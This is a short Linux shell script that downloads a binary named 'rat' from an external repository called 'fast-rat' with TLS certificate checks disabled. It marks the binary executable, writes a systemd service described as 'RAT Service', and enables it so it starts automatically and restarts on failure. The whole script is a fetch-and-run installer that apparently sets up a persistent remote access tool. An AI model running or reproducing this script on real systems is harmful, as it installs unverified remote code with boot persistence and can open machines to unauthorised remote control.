cd /home
wget --no-check-certificate https://raw.imbytecat.com/imByteCat/fast-rat/master/linux/rat
chmod +x rat
cat > "/usr/lib/systemd/system/rat.service" << EOF
[Unit]
Description=RAT Service
After=network.target syslog.target
Wants=network.target

[Service]
Type=forking
ExecStart=/home/rat
KillMode=process
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
Restart=on-failure
RestartSec=5s
EOF
systemctl daemon-reload
systemctl start rat
systemctl enable rat
